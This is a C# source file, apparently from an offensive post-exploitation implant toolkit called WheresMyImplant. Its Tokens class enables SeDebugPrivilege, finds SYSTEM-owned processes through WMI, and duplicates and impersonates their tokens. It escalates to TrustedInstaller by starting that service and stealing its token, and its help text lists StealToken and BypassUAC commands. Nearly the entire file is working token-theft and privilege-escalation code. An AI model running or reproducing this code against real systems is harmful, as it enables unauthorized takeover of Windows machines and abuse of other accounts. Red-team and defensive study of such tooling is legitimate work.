using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;

using Unmanaged;

namespace WheresMyImplant
{
    class Tokens : Base
    {
        private const String helpMessage = @"
Invalid Options
GetSystem            <new_process>
GetTrustedInstaller  <new_process>
StealToken           <process_id> <new_process>
BypassUAC            <process_id> <new_process>";

        protected IntPtr phNewToken;
        protected IntPtr hExistingToken;
        private IntPtr currentProcessToken;
        private Dictionary<UInt32, String> processes;

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal Tokens()
        {
            phNewToken = new IntPtr();
            hExistingToken = new IntPtr();
            processes = new Dictionary<UInt32, String>();
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                WriteOutputBad("Administrator privileges required");
            }

            currentProcessToken = new IntPtr();
            kernel32.OpenProcessToken(Process.GetCurrentProcess().Handle, Constants.TOKEN_ALL_ACCESS, out currentProcessToken);
            SetTokenPrivilege(ref currentProcessToken, Constants.SE_DEBUG_NAME);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        ~Tokens()
        {
            kernel32.CloseHandle(phNewToken);
            kernel32.CloseHandle(hExistingToken);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal void GetHelp()
        {
            WriteOutputBad(helpMessage);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean StartProcessAsUser(Int32 processId, String newProcess)
        {
            GetPrimaryToken((UInt32)processId, "");
            if (hExistingToken == IntPtr.Zero)
            {
                return false;
            }
            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED,
                        IntPtr.Zero,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt.TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                GetError("DuplicateTokenEx: ");
                return false;
            }
            WriteOutputGood("Duplicate Token Handle: "+ phNewToken.ToInt32());
            if (!CreateProcessWithTokenW(phNewToken, newProcess, ""))
            {
                return false;
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal virtual Boolean ImpersonateUser(Int32 processId)
        {
            GetPrimaryToken((UInt32)processId, "");
            if (hExistingToken == IntPtr.Zero)
            {
                return false;
            }
            if (!advapi32.DuplicateTokenEx(
                        hExistingToken,
                        (UInt32)Winnt.ACCESS_MASK.MAXIMUM_ALLOWED,
                        IntPtr.Zero,
                        Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                        Winnt.TOKEN_TYPE.TokenPrimary,
                        out phNewToken
            ))
            {
                GetError("DuplicateTokenEx: ");
                return false;
            }
            WriteOutputGood("Duplicate Token Handle: "+ phNewToken.ToInt32());
            if (!advapi32.ImpersonateLoggedOnUser(phNewToken))
            {
                GetError("ImpersonateLoggedOnUser: ");
                return false;
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean GetSystem(String newProcess)
        {
            SecurityIdentifier systemSID = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            String LocalSystemNTAccount = systemSID.Translate(typeof(NTAccount)).Value.ToString();
            EnumerateTokens(LocalSystemNTAccount);

            foreach (UInt32 process in processes.Keys)
            {
                if (StartProcessAsUser((Int32)process, newProcess))
                {
                    return true;
                }
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean GetSystem()
        {
            SecurityIdentifier systemSID = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            String LocalSystemNTAccount = systemSID.Translate(typeof(NTAccount)).Value.ToString();
            EnumerateTokens(LocalSystemNTAccount);

            foreach (UInt32 process in processes.Keys)
            {
                if (ImpersonateUser((Int32)process))
                {
                    return true;
                }
            }
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean GetTrustedInstaller(String newProcess)
        {
            WriteOutputGood("Getting NT AUTHORITY\\SYSTEM privileges");
            GetSystem();
            WriteOutputGood("Running as: "+ WindowsIdentity.GetCurrent().Name);
            
            Services services = new Services("TrustedInstaller");
            if (!services.StartService())
            {
                GetError("StartService");
                return false;
            }

            if (!StartProcessAsUser((Int32)services.GetServiceProcessId(), newProcess))
            {
                GetError("StartProcessAsUser");
                return false;
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean GetTrustedInstaller()
        {
            WriteOutputNeutral("Getting NT AUTHORITY\\SYSTEM privileges");
            GetSystem();
            WriteOutputGood("Running as: "+ WindowsIdentity.GetCurrent().Name);

            Services services = new Services("TrustedInstaller");
            if (!services.StartService())
            {
                GetError("StartService");
                return false;
            }

            if (!ImpersonateUser((Int32)services.GetServiceProcessId()))
            {
                GetError("ImpersonateUser");
                return false;
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        protected Boolean CreateProcessWithLogonW(IntPtr phNewToken, String name, String arguments)
        {
            WriteOutputGood("CreateProcessWithLogonW");
            IntPtr lpProcessName = Marshal.StringToHGlobalUni(name);
            IntPtr lpProcessArgs = Marshal.StringToHGlobalUni(name);
            Winbase._STARTUPINFO startupInfo = new Winbase._STARTUPINFO();
            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Winbase._STARTUPINFO));
            Winbase._PROCESS_INFORMATION processInformation = new Winbase._PROCESS_INFORMATION();
            if (!advapi32.CreateProcessWithLogonW(
                "i",
                "j",
                "k",
                0x00000002,
                name,
                arguments,
                0x04000000,
                IntPtr.Zero,
                Environment.SystemDirectory,
                ref startupInfo,
                out processInformation
            ))
            {
                GetError("CreateProcessWithLogonW: ");
                return false;
            }
            WriteOutputGood("Created process: "+ processInformation.dwProcessId);
            WriteOutputGood("Created thread: "+ processInformation.dwThreadId);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        protected Boolean CreateProcessWithTokenW(IntPtr phNewToken, String name, String arguments)
        {
            Console.WriteLine("CreateProcessWithTokenW");
            IntPtr lpProcessName = Marshal.StringToHGlobalUni(name);
            IntPtr lpProcessArgs = Marshal.StringToHGlobalUni(name);
            Winbase._STARTUPINFO startupInfo = new Winbase._STARTUPINFO();
            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Winbase._STARTUPINFO));
            Winbase._PROCESS_INFORMATION processInformation = new Winbase._PROCESS_INFORMATION();
            if (!advapi32.CreateProcessWithTokenW(
                phNewToken,
                advapi32.LOGON_FLAGS.NetCredentialsOnly,
                lpProcessName,
                lpProcessArgs,
                Winbase.CREATION_FLAGS.NONE,
                IntPtr.Zero,
                IntPtr.Zero,
                ref startupInfo,
                out processInformation
            ))
            {
                GetError("CreateProcessWithTokenW: ");
                return false;
            }
            WriteOutputGood("Created process: "+ processInformation.dwProcessId);
            WriteOutputGood("Created thread: "+ processInformation.dwThreadId);
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal void EnumerateTokens(String userAccount)
        {
            Int32 size = 0;
            List<ManagementObject> systemProcesses = new List<ManagementObject>();
            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
            scope.Connect();
            if (!scope.IsConnected)
            {
                WriteOutputBad("Failed to connect to WMI");
            }

            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection objectCollection = objectSearcher.Get();
            WriteOutputNeutral("Examining "+ objectCollection.Count + "processes");
            foreach (ManagementObject managementObject in objectCollection)
            {
                try
                {
                    String[] owner = new String[2];
                    managementObject.InvokeMethod("GetOwner", (object[])owner);
                    if ((owner[1] + "\\"+ owner[0]).ToUpper() == userAccount.ToUpper())
                    {
                        processes.Add((UInt32)managementObject["ProcessId"], (String)managementObject["Name"]);
                        size++;
                    }
                }
                catch (ManagementException error)
                {
                    WriteOutputBad(""+ error);
                }
            }
            WriteOutputNeutral("Discovered "+ size + "processes");
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal virtual void GetPrimaryToken(UInt32 processId, String name)
        {
            //Originally Set to true
            IntPtr hProcess = kernel32.OpenProcess(Constants.PROCESS_QUERY_INFORMATION, true, processId);
            if (hProcess == IntPtr.Zero)
            {
                return;
            }
            WriteOutputGood("Recieved Handle for: "+ name + "("+ processId + ")");
            WriteOutputGood("Process Handle: "+ hProcess.ToInt32());

            if (kernel32.OpenProcessToken(hProcess, Constants.TOKEN_ALT, out hExistingToken))
            {
                WriteOutputGood("Primary Token Handle: "+ hExistingToken.ToInt32());
            }
            kernel32.CloseHandle(hProcess);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private IntPtr OpenThreadTokenChecked()
        {
            IntPtr hToken = new IntPtr();
            WriteOutputNeutral("Opening Thread Token");
            if (!kernel32.OpenThreadToken(kernel32.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
            {
                WriteOutputBad("OpenTheadToken Failed");
                WriteOutputNeutral("Impersonating Self");
                if (!advapi32.ImpersonateSelf(Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
                {
                    GetError("ImpersonateSelf");
                    return IntPtr.Zero;
                }
                WriteOutputGood("Impersonated Self");
                WriteOutputNeutral("Retrying");
                if (!kernel32.OpenThreadToken(kernel32.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
                {
                    GetError("OpenThreadToken");
                    return IntPtr.Zero;
                }
            }
            WriteOutputGood("Recieved Thread Token Handle: "+ hToken.ToInt32());
            return hToken;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
        //https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
        ////////////////////////////////////////////////////////////////////////////////
        internal void SetTokenPrivilege(ref IntPtr hToken, String privilege, Boolean bEnable)
        {
            WriteOutputNeutral("Adjusting Token Privilege");
            ////////////////////////////////////////////////////////////////////////////////
            Winnt._LUID luid = new Winnt._LUID();
            if (!advapi32.LookupPrivilegeValue(null, privilege, ref luid))
            {
                GetError("LookupPrivilegeValue");
                return;
            }
            WriteOutputGood("Recieved luid");

            ////////////////////////////////////////////////////////////////////////////////
            Winnt._LUID_AND_ATTRIBUTES luidAndAttributes = new Winnt._LUID_AND_ATTRIBUTES();
            luidAndAttributes.Luid = luid;
            luidAndAttributes.Attributes = 0;

            Winnt._TOKEN_PRIVILEGES newState = new Winnt._TOKEN_PRIVILEGES();
            newState.PrivilegeCount = 1;
            newState.Privileges = luidAndAttributes;

            Winnt._TOKEN_PRIVILEGES previousState = new Winnt._TOKEN_PRIVILEGES();
            UInt32 returnLength = 0;
            WriteOutputGood("AdjustTokenPrivilege Pass 1");
            if (!advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
            {
                GetError("AdjustTokenPrivileges - 1");
                return;
            }

            ////////////////////////////////////////////////////////////////////////////////
            previousState.PrivilegeCount = 1;
            if (bEnable)
            {
                previousState.Privileges.Attributes |= Constants.SE_PRIVILEGE_ENABLED;
            }
            else
            {
                previousState.Privileges.Attributes ^= (Constants.SE_PRIVILEGE_ENABLED & previousState.Privileges.Attributes);
            }

            ////////////////////////////////////////////////////////////////////////////////
            Winnt._TOKEN_PRIVILEGES kluge = new Winnt._TOKEN_PRIVILEGES();
            WriteOutputGood("AdjustTokenPrivilege Pass 2");
            if (!advapi32.AdjustTokenPrivileges(hToken, false, ref previousState, (UInt32)Marshal.SizeOf(previousState), ref kluge, out returnLength))
            {
                GetError("AdjustTokenPrivileges - 2");
                return;
            }

            WriteOutputGood("Adjusted Token to: "+ privilege);
            return;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
        //https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
        ////////////////////////////////////////////////////////////////////////////////
        internal void SetTokenPrivilege(ref IntPtr hToken, String privilege)
        {
            WriteOutputGood("Adjusting Token Privilege");
            ////////////////////////////////////////////////////////////////////////////////
            Winnt._LUID luid = new Winnt._LUID();
            if (!advapi32.LookupPrivilegeValue(null, privilege, ref luid))
            {
                GetError("LookupPrivilegeValue");
                return;
            }
            WriteOutputGood("Recieved luid");

            ////////////////////////////////////////////////////////////////////////////////
            Winnt._LUID_AND_ATTRIBUTES luidAndAttributes = new Winnt._LUID_AND_ATTRIBUTES();
            luidAndAttributes.Luid = luid;
            luidAndAttributes.Attributes = Constants.SE_PRIVILEGE_ENABLED;

            Winnt._TOKEN_PRIVILEGES newState = new Winnt._TOKEN_PRIVILEGES();
            newState.PrivilegeCount = 1;
            newState.Privileges = luidAndAttributes;

            Winnt._TOKEN_PRIVILEGES previousState = new Winnt._TOKEN_PRIVILEGES();
            UInt32 returnLength = 0;
            WriteOutputNeutral("AdjustTokenPrivilege");
            if (!advapi32.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
            {
                GetError("AdjustTokenPrivileges");
                return;
            }

            WriteOutputGood("Adjusted Token to: "+ privilege);
            return;
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal void EnumerateTokenPrivileges(IntPtr hToken)
        {
            ////////////////////////////////////////////////////////////////////////////////
            UInt32 TokenInfLength = 0;
            WriteOutputNeutral("Enumerating Token Privileges");
            advapi32.GetTokenInformation(
                hToken, 
                Winnt._TOKEN_INFORMATION_CLASS.TokenPrivileges, 
                IntPtr.Zero, 
                TokenInfLength, 
                out TokenInfLength
            );

            if (TokenInfLength < 0 || TokenInfLength > Int32.MaxValue)  
            {
                GetError("GetTokenInformation - 1 "+ TokenInfLength);
                return;
            }
            WriteOutputNeutral("GetTokenInformation - Pass 1");
            IntPtr lpTokenInformation = Marshal.AllocHGlobal((Int32)TokenInfLength) ;
            
            ////////////////////////////////////////////////////////////////////////////////
            if (!advapi32.GetTokenInformation(
                hToken, 
                Winnt._TOKEN_INFORMATION_CLASS.TokenPrivileges, 
                lpTokenInformation, 
                TokenInfLength, 
                out TokenInfLength))
            {
                GetError("GetTokenInformation - 2"+ TokenInfLength);
                return;
            }
            WriteOutputNeutral("GetTokenInformation - Pass 2");
            Winnt._TOKEN_PRIVILEGES_ARRAY tokenPrivileges = (Winnt._TOKEN_PRIVILEGES_ARRAY)Marshal.PtrToStructure(lpTokenInformation, typeof(Winnt._TOKEN_PRIVILEGES_ARRAY));
            WriteOutputGood("Enumerated "+ tokenPrivileges.PrivilegeCount + "Privileges");

            ////////////////////////////////////////////////////////////////////////////////
            for (Int32 i = 0; i < tokenPrivileges.PrivilegeCount; i++)
            {
                StringBuilder lpName = new StringBuilder();
                Int32 cchName = 0;
                IntPtr lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(tokenPrivileges.Privileges[i]));
                Marshal.StructureToPtr(tokenPrivileges.Privileges[i].Luid, lpLuid, true);
                advapi32.LookupPrivilegeName(null, lpLuid, null, ref cchName);
                if (cchName < 0 || cchName > Int32.MaxValue)  
                {
                    GetError("LookupPrivilegeName "+ cchName);
                    return;
                }

                lpName.EnsureCapacity(cchName + 1);
                if (advapi32.LookupPrivilegeName(null, lpLuid, lpName, ref cchName))
                {
                    WriteOutputNeutral(""+ lpName.ToString());
                }
                Marshal.FreeHGlobal(lpLuid);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        protected void GetError(String location)
        {
            WriteOutputBad("Function "+ location + "failed: "+ Marshal.GetLastWin32Error());
        }
    }
}
